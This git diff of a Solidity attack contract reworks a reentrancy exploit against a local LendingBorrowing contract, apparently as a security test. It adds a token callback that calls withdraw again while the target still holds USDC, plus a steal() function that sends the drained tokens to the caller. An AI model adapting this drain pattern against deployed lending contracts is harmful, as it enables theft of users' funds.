@@ -4,6 +4,7 @@ pragma solidity ^0.8.18;
 import "../LendingBorrowing.sol";
 
 import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import "hardhat/console.sol";
 
 contract AttackContract {
     IERC20 private s_usdc;
@@ -26,15 +27,25 @@ contract AttackContract {
     }
 
     // This is the function that gets called recursively by the withdraw function
-    receive() external payable {
-        if (address(lendingBorrowing).balance >= msg.value) {
-            lendingBorrowing.withdraw(msg.value);
+    function receiveTokens(address sender, uint256 amount) public {
+        uint256 balance = s_usdc.balanceOf(address(lendingBorrowing));
+        console.log("balance: %s", balance);
+
+        if (balance > amount) {
+            console.log("reentry");
+            lendingBorrowing.withdraw(amount);
         }
     }
 
+    // fallback() external payable {
+    //     console.log("Fallback called");
+    //     if (address(lendingBorrowing).balance >= msg.value) {
+    //         lendingBorrowing.withdraw(msg.value);
+    //     }
+    // }
+
     // The owner of the contract withdraw the stolen funds
     function steal() public {
-        require(msg.sender == owner, "Only attacker can call this function");
-        payable(owner).transfer(address(this).balance);
+        s_usdc.transfer(msg.sender, s_usdc.balanceOf(address(this)));
     }
 }
